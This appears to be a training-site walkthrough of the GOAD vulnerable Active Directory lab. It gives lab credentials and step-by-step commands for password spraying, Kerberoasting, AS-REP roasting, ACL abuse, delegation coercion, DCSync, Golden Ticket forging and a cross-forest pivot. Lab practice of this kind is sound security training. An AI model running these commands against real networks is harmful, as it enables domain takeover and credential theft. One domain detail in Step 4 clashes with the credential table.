---
layout: training-page
title: "Game of Active Directory (GOAD) — Red Team Academy"
module: "Active Directory"
tags:
  - goad
  - lab
  - practice
page_key: "ad-goad"
render_with_liquid: false
---

# Game of Active Directory (GOAD)

## About GOAD

GOAD (Game of Active Directory) is a deliberately vulnerable multi-domain Active Directory lab maintained by Orange Cyberdefense. It's one of the most comprehensive free AD attack practice environments available — modeled after Game of Thrones with authentic domain names, users, and intentional misconfigurations spanning the full AD attack chain. See **Lab Setup** for installation instructions.

![GOAD lab network: 5 VMs across 3 domains - SEVENKINGDOMS.LOCAL, NORTH.SEVENKINGDOMS.LOCAL, and ESSOS.LOCAL with domain trust relationships](/images/active-directory/goad-network.svg)  
*// goad lab architecture — 5 VMs, 3 domains, cross-forest trusts*

## Lab Architecture

```
# GOAD Network Layout (all on 192.168.56.0/24):
#
# Forest 1: SEVENKINGDOMS.LOCAL
# ├── DC01  kingslanding.sevenkingdoms.local    192.168.56.11  (WS2019, DC)
# ├── DC02  winterfell.north.sevenkingdoms.local 192.168.56.10  (WS2019, child DC)
# └── SRV02 castelblack.north.sevenkingdoms.local 192.168.56.22 (WS2019, member)
#
# Forest 2: ESSOS.LOCAL
# ├── DC03  meereen.essos.local                 192.168.56.12  (WS2016, DC)
# └── SRV03 braavos.essos.local                 192.168.56.23  (WS2016, member)
#
# Trust: SEVENKINGDOMS ←bidirectional→ ESSOS (cross-forest trust)
# Trust: SEVENKINGDOMS → NORTH (parent-child trust)
```

## Known Credentials & Accounts

| Username | Domain | Password | Notes |
| --- | --- | --- | --- |
| vagrant | local (all VMs) | vagrant | Local admin on all GOAD VMs — start here |
| hodor | north.sevenkingdoms.local | hodor | Password spray target, local admin on castelblack |
| jon.snow | north.sevenkingdoms.local | iknownothing | SPN set — Kerberoastable |
| samwell.tarly | north.sevenkingdoms.local | Heartsbane | Domain user, local admin on castelblack |
| brandon.stark | north.sevenkingdoms.local | iseedeadpeople | DONT_REQ_PREAUTH — AS-REP roastable |
| robb.stark | north.sevenkingdoms.local | sexywolfy | Domain user |
| cersei.lannister | sevenkingdoms.local | il0vejaime | LANNISTER group member — ACL abuse target |
| khal.drogo | essos.local | horse | Domain admin in ESSOS — cross-forest pivot target |
| daenerys.targaryen | essos.local | BurnThemAll! | DONT_REQ_PREAUTH — AS-REP roastable |

## Intentional Vulnerabilities

| Vulnerability | Target | Attack |
| --- | --- | --- |
| Weak password (hodor/hodor) | hodor@NORTH | Password spray |
| SPN set on user account | jon.snow@NORTH | Kerberoasting |
| Kerberos pre-auth disabled | TARGARYEN users@SEVEN | AS-REP Roasting |
| Unconstrained delegation | castelblack (SRV02) | Printer bug + TGT capture |
| ForceChangePassword ACE | LANNISTER group | ACL abuse — reset target password |
| GenericWrite ACE | LANNISTER group | ACL abuse — set SPN, targeted Kerberoasting |
| SMB signing disabled | Member servers | NTLM relay attack |
| Cross-forest trust | SEVEN ↔ ESSOS | Cross-forest trust ticket / SID history |

## Lab Reset — Restore Clean State

```
# Before a practice session — always reset to clean state:
cd /path/to/GOAD
vagrant snapshot restore --no-provision

# Or restore individual VMs:
VBoxManage snapshot "GOAD-DC01" restore "clean"
VBoxManage snapshot "GOAD-DC02" restore "clean"
VBoxManage snapshot "GOAD-DC03" restore "clean"
VBoxManage snapshot "GOAD-SRV02" restore "clean"
VBoxManage snapshot "GOAD-SRV03" restore "clean"

# After attacks that modify AD (password resets, object creation):
# MUST restore before next session — AD changes persist across reboots
```

## Step 1 — Initial Foothold (Password Spray)

```
# Spray hodor:hodor across the lab network (NetExec / CrackMapExec):
netexec smb 192.168.56.0/24 -u 'hodor' -p 'hodor' -d 'north.sevenkingdoms.local'
# or: crackmapexec smb 192.168.56.0/24 -u 'hodor' -p 'hodor' -d 'north.sevenkingdoms.local'
# Look for (Pwn3d!) — hodor has local admin on castelblack (192.168.56.22)

# Get a shell via evil-winrm (WinRM on 5985):
evil-winrm -i 192.168.56.22 -u 'hodor' -p 'hodor'

# Or via psexec.py (Impacket) — drops a service binary, noisier:
psexec.py 'north.sevenkingdoms.local/hodor:hodor@192.168.56.22'

# wmiexec.py — no service binary, semi-interactive:
wmiexec.py 'north.sevenkingdoms.local/hodor:hodor@192.168.56.22'
```

## Step 2 — AD Enumeration

```
# From Kali — BloodHound CE collection (no Windows required):
bloodhound-python \
  -d 'north.sevenkingdoms.local' \
  -u 'hodor' \
  -p 'hodor' \
  -ns 192.168.56.10 \
  -c All \
  --zip
# Upload the zip to BloodHound CE at http://localhost:8080

# Quick enumeration with NetExec — users, groups, shares:
netexec smb 192.168.56.10 -u 'hodor' -p 'hodor' -d 'north.sevenkingdoms.local' --users
netexec smb 192.168.56.10 -u 'hodor' -p 'hodor' -d 'north.sevenkingdoms.local' --groups
netexec smb 192.168.56.22 -u 'hodor' -p 'hodor' -d 'north.sevenkingdoms.local' --shares

# LDAP enum with NetExec:
netexec ldap 192.168.56.10 -u 'hodor' -p 'hodor' -d 'north.sevenkingdoms.local' \
  --active-users --kerberoasting kerb.txt --asreproast asrep.txt
```

## Step 3 — Kerberoasting (jon.snow)

```
# jon.snow has an SPN — request his TGS ticket from Linux:
GetUserSPNs.py 'north.sevenkingdoms.local/hodor:hodor' \
  -dc-ip 192.168.56.10 -request

# Crack the hash:
hashcat -m 13100 jon_snow.hash /usr/share/wordlists/rockyou.txt
# → iknownothing
```

## Step 4 — AS-REP Roasting (TARGARYEN Users)

```
># TARGARYEN users on sevenkingdoms.local have pre-auth disabled:
GetNPUsers.py 'sevenkingdoms.local/' \
  -dc-ip 192.168.56.11 \
  -usersfile users.txt \
  -no-pass \
  -format hashcat

# Crack:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Step 5 — ACL Abuse (LANNISTER Group)

```
# After owning a LANNISTER group member:
# Use ForceChangePassword to reset a target user's password:
rpcclient -U 'north.sevenkingdoms.local/lannister_user%password' 192.168.56.10
rpcclient $> setuserinfo2 target_user 23 'NewP@ssw0rd!'

# From Windows with PowerView:
Set-DomainUserPassword -Identity 'target_user' \
  -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) \
  -Credential $cred
```

## Step 6 — Unconstrained Delegation (castelblack)

```
# castelblack (SRV02) has unconstrained delegation enabled.
# Coerce DC01 to authenticate to castelblack — its TGT is stored there.

# Monitor for incoming TGTs on castelblack (Windows):
Rubeus.exe monitor /interval:5 /nowrap

# Trigger DC01 authentication (PrinterBug from Kali):
python3 printerbug.py 'north.sevenkingdoms.local/hodor:hodor@192.168.56.11' 192.168.56.22

# Import captured DC TGT:
Rubeus.exe ptt /ticket:BASE64_TGT

# Now DCSync as the DC machine account:
mimikatz # lsadump::dcsync /user:north\krbtgt
```

## Step 7 — DCSync & Golden Ticket

```
# With DA or DC machine account — dump all hashes:
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10'

# Or from a DA session with mimikatz:
# lsadump::dcsync /domain:north.sevenkingdoms.local /all /csv

# Extract krbtgt hash (needed for Golden Ticket):
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10' \
  -just-dc-user krbtgt

# Create Golden Ticket with Impacket:
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-xxxx \
  -domain north.sevenkingdoms.local \
  Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc02.north.sevenkingdoms.local
```

## Step 8 — Cross-Forest Pivot (ESSOS)

SEVENKINGDOMS and ESSOS have a bidirectional cross-forest trust. After owning SEVENKINGDOMS, pivot to ESSOS using the trust.

```
# Enumerate ESSOS from NORTH with existing creds:
netexec smb 192.168.56.12 -u 'Administrator' -p 'password' -d 'north.sevenkingdoms.local'

# Enumerate ESSOS users and computers via trust:
bloodhound-python -d essos.local -u 'Administrator@north.sevenkingdoms.local' \
  -p 'password' -ns 192.168.56.12 -c All

# Get inter-realm TGT ticket for ESSOS:
# After obtaining SEVENKINGDOMS domain trust key (from secretsdump):
# "sevenkingdoms.local\essos.local Kerberos AES256 key"

# Use getST.py to get a cross-forest TGS:
getST.py -spn 'cifs/braavos.essos.local' \
  -hashes :TRUST_KEY_NTLM \
  -impersonate Administrator \
  'sevenkingdoms.local/Administrator' \
  -dc-ip 192.168.56.11

# Or use BloodHound — "Shortest Path to Domain" across the trust
# Then authenticate to ESSOS with SEVENKINGDOMS DA:
psexec.py -k -no-pass Administrator@braavos.essos.local
```

## Attack Sequence Summary

1. Password spray → `hodor:hodor` → local admin on castelblack
2. BloodHound collection → map domain attack graph
3. Kerberoast `jon.snow` → crack → `iknownothing`
4. AS-REP Roast TARGARYEN users on sevenkingdoms.local
5. ACL abuse via LANNISTER group → ForceChangePassword / GenericWrite
6. Unconstrained delegation on castelblack → coerce DC auth → capture TGT → DCSync
7. DCSync → krbtgt hash → Golden Ticket → persistent domain access
8. Cross-forest pivot to ESSOS via bidirectional trust

## Key Resources

- [GOAD repository and full documentation](https://github.com/Orange-Cyberdefense/GOAD)
- [GOAD author's blog with detailed attack walkthroughs](https://mayfly277.github.io)
- [Detailed per-attack walkthroughs in GOAD docs](https://github.com/Orange-Cyberdefense/GOAD/tree/main/docs)

**// GOAD-NG** — Orange Cyberdefense is working on GOAD-NG (Next Generation), a rewrite using the `goad.sh` provisioner with support for additional AD misconfiguration scenarios, Azure AD integration, and more modern attack paths. Check the GOAD GitHub for the latest version before installation.
